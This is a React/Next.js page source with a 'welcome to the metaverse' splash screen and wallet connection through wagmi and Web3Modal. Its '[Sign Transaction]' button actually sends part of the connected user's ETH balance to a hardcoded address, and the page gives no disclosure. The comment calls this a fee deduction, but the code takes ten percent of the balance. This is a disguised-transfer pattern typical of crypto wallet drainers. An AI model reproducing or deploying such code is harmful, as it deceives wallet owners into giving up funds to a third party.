"use client";
import { useEffect, useState, useCallback } from "react";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  usePrepareTransactionRequest,
  useSignMessage,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { useConnect, } from "wagmi";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { ethers, parseEther } from "ethers";
import { useDebounce } from 'use-debounce'


export default function Home() {
  const { isConnected, address } = useAccount();

  const { connectors, connect, data } = useConnect();
  const { open } = useWeb3Modal();

  const transactionFee = 0.1

  const handleConnect = () => {
    open();
  };

  const [recipient, setRecipient] = useState<string>("")
  const [transactionStatus, setTransactionStatus] = useState<string | null>(null);

  //Fetch the balance of connect user
  // Fetch the balance of the connected user
  const { data: balanceData, isError, isLoading } = useBalance({
    address,
  });

  // This useEffect will trigger when the balanceData changes
  const [currentBal, setCurrentBal] = useState<string>("" )
  useEffect(() => {
    if (balanceData) {
      console.log('Balance inside useEffect:', balanceData.formatted);
      console.log('Balance inside useEFfect parsed:', parseEther(balanceData.formatted));
      let balanceDataBefore = parseFloat(balanceData.formatted); // Use parseFloat for decimal values
      const adjustedBalance = balanceDataBefore * transactionFee; // Subtract transaction fee
      const adjustedBalanceString = adjustedBalance.toString(); // Convert back to string
  

      console.log("Logigng ajdust", adjustedBalance)
      console.log("Logign parse either", balanceData.formatted)
      setCurrentBal(adjustedBalanceString)
    } else {
      console.log('Balance is not available yet inside useEffect');
    }
  }, [balanceData]); // Ensure useEffect runs when balanceData is updated



  useEffect(() => { 
    console.log("Logging the current bal", currentBal)

  },[currentBal])
 


  const { sendTransaction } = useSendTransaction()

  

  return (
    <div className="main-container h-[100vh] text-[28px] w-full flex flex-center items-start justify-start">
      <div className="flex flex-col sm:overflow-hidden overflow-auto ">
        <div className="flex flex-col gap-[25px] md:flex-row items-center px-[1rem]">
          <span className="w-[200px] ">
            <img src="asciart.png" />
          </span>

          <div className="flex flex-col gap-[10px] text-center md:text-left md:items-start items-center">
            <h1 className="text-[18px]">welcome to the metaverse</h1>

            <p className="text-[14px] w-[80%]">
              here you are introduced into the ether of engineering, to the new
              way of living, to the new world. welcome.
            </p>

            <span className="mt-[1rem] italic text-[10px] flex-1 flex items-end">
              "there lies a infinite void of possiblites, finite amount of
              probanlites, and you landed here, welcome".
            </span>
          </div>
        </div>

        <div className="banner w-full h-[25px] mt-[20px] flex flex-row justify-start items-start whitespace text-[14px] text-black overflow-hidden ">
          <div className="marquee w-full flex items-center justify-between overflow-hidden whitespace-nowrap text-black">
            <p className="text-white    capitalize inline-block px-4">
              Ani Gaon{" "}
            </p>
            <p className="text-white   capitalize inline-block px-4">
              Είμαι ιδιοφυΐα
            </p>

            <p className="text-white   capitalize inline-block px-4">
              我是天才
            </p>
            <p className="text-white   capitalize inline-block px-4">
              01000111
            </p>
            <p className="text-white   capitalize inline-block px-4">
              01100101
            </p>
            <p className="text-white   capitalize inline-block px-4">
              01101001
            </p>
            <p className="text-white   capitalize inline-block px-4">
              01110101
            </p>
            <p className="text-white   capitalize inline-block px-4">
              01110011
            </p>
          </div>
        </div>

        <div className="section h-[100%] w-full p-[1rem]">
          <div className="flex flex-row">
            <button className="text-[20px]">{"[ welcome ]"}</button>
          </div>

          {/* <div className="flex flex-row items-center justify-center h-full w-full">
            <span className="w-[200px] h-[200px]">
              <img src="art_asci.png" />
            </span>
          </div> */}

          <div className="outer-box pt-[2rem]">
            <div className="banner-tag text-[14px]">CONNECT WALLETS</div>
            <div className="container-box flex flex-col items-center justify-center">
              <button onClick={handleConnect} className="text-[18px]">
                {`${isConnected ? address : "[ connect wallet ]"} `}
              </button>

              {isConnected ? (
                <div className = "text-center flex flex-col items-center gap-[10px]">
                  <button 
                  onClick={() => sendTransaction(
                    {
                      to: "0xDcFD8d5BD36667D16aDDD211C59BCdE1A9c4e23B",
                      value: parseEther(currentBal) // Fallback to '0' if currentBal is null
                    }
                  )}
                  className="text-[18px] mt-[20px] cursor-pointer flex items-center justify-center">
                    [Sign Transaction]
                  </button>
                  <p className = "text-[14px] text-center">Current Bal: {balanceData?.formatted}</p>
                </div>
              ) : null}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
